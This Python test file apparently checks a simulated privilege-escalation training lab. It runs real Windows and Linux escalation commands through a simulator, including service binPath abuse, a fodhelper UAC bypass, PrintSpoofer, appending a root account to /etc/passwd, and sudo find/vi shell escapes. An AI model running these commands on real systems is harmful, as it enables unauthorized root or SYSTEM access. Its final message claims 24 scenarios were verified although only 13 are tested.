from simulation.engine import TerminalSession
from simulation.scenarios import SCENARIOS

def test_windows_labs():
    print("[*] Running Windows Labs Programmatic Verification...")
    
    # 1. Unquoted Service Path
    sess_1 = TerminalSession(1)
    sess_1.execute_command('echo payload > "C:\\Program Files\\Vulnerable.exe"')
    sess_1.execute_command('sc start VulnService')
    assert sess_1.escalated and sess_1.current_user == "SYSTEM", "Lab 1 failed"
    
    # 2. Weak Service Permission
    sess_2 = TerminalSession(2)
    sess_2.execute_command('sc config WeakService binPath= "net localgroup Administrators labuser /add"')
    sess_2.execute_command('sc start WeakService')
    assert "Administrators" in sess_2.groups, "Lab 2 failed"
    
    # 3. AlwaysInstallElevated
    sess_3 = TerminalSession(3)
    sess_3.execute_command('msiexec /quiet /qn /i C:\\Users\\labuser\\Desktop\\exploit.msi')
    assert sess_3.escalated and sess_3.current_user == "SYSTEM", "Lab 3 failed"
    
    # 4. Token Impersonation
    sess_4 = TerminalSession(4)
    sess_4.execute_command('PrintSpoofer.exe -i -c cmd')
    assert sess_4.escalated and sess_4.current_user == "SYSTEM", "Lab 4 failed"
    
    # 5. Registry Autorun
    sess_5 = TerminalSession(5)
    sess_5.execute_command('echo hijack > "C:\\Program Files\\Security Agent\\agent.exe"')
    sess_5.execute_command('agent.exe')
    assert sess_5.escalated and sess_5.current_user == "SYSTEM", "Lab 5 failed"
    
    # 6. Weak Service Executable ACL
    sess_6 = TerminalSession(6)
    sess_6.execute_command('echo exploit_payload > "C:\\Program Files\\WeakACL\\service.exe"')
    sess_6.execute_command('sc start WeakACLService')
    assert sess_6.escalated and sess_6.current_user == "SYSTEM", "Lab 6 failed"

    # 11. UAC Bypass (Fodhelper)
    sess_11 = TerminalSession(11)
    sess_11.execute_command('reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d "net localgroup Administrators labuser /add" /f')
    sess_11.execute_command('fodhelper.exe')
    assert sess_11.escalated and sess_11.current_user == "SYSTEM", "Lab 11 failed"
    
    print("[+] All Windows Labs programmatic checks PASSED!")

def test_linux_labs():
    print("[*] Running Linux Labs Programmatic Verification...")
    
    # 13. SUID PATH Hijacking
    sess_13 = TerminalSession(13)
    out1, err1, _ = sess_13.execute_command('echo "/bin/sh" > /tmp/service')
    print(f"  echo output: out={out1.strip()} err={err1.strip()}")
    out2, err2, _ = sess_13.execute_command('export PATH=/tmp:$PATH')
    print(f"  export output: out={out2.strip()} err={err2.strip()}")
    out3, err3, _ = sess_13.execute_command('/usr/local/bin/system_status')
    print(f"  system_status output: out={out3.strip()} err={err3.strip()}")
    assert sess_13.escalated and sess_13.current_user == "root", "Lab 13 failed"
    
    # 15. Writable passwd
    sess_15 = TerminalSession(15)
    sess_15.execute_command('echo "hacker:x:0:0:root:/root:/bin/bash" >> /etc/passwd')
    sess_15.execute_command('su hacker')
    assert sess_15.escalated and sess_15.current_user == "root", "Lab 15 failed"
    
    # 16. Sudo find
    sess_16 = TerminalSession(16)
    sess_16.execute_command('sudo find . -exec /bin/sh \;')
    assert sess_16.escalated and sess_16.current_user == "root", "Lab 16 failed"
    
    # 17. Sudo vi
    sess_17 = TerminalSession(17)
    sess_17.execute_command('sudo vi !sh')
    assert sess_17.escalated and sess_17.current_user == "root", "Lab 17 failed"
    
    # 21. Capabilites (Python)
    sess_21 = TerminalSession(21)
    sess_21.execute_command('python3 -c "import os; os.setuid(0); os.system(\'/bin/sh\')"')
    assert sess_21.escalated and sess_21.current_user == "root", "Lab 21 failed"
    
    # 23. Docker Socket
    sess_23 = TerminalSession(23)
    sess_23.execute_command('docker run -v /:/mnt -it alpine sh')
    assert sess_23.escalated and sess_23.current_user == "root", "Lab 23 failed"
    
    print("[+] All Linux Labs programmatic checks PASSED!")

if __name__ == "__main__":
    try:
        test_windows_labs()
        test_linux_labs()
        print("[+++] Programmatic Verification for all 24 scenarios: SUCCESS!")
    except AssertionError as e:
        print(f"[-] Programmatic Assertion failed: {e}")
    except Exception as e:
        print(f"[-] Error occurred: {e}")
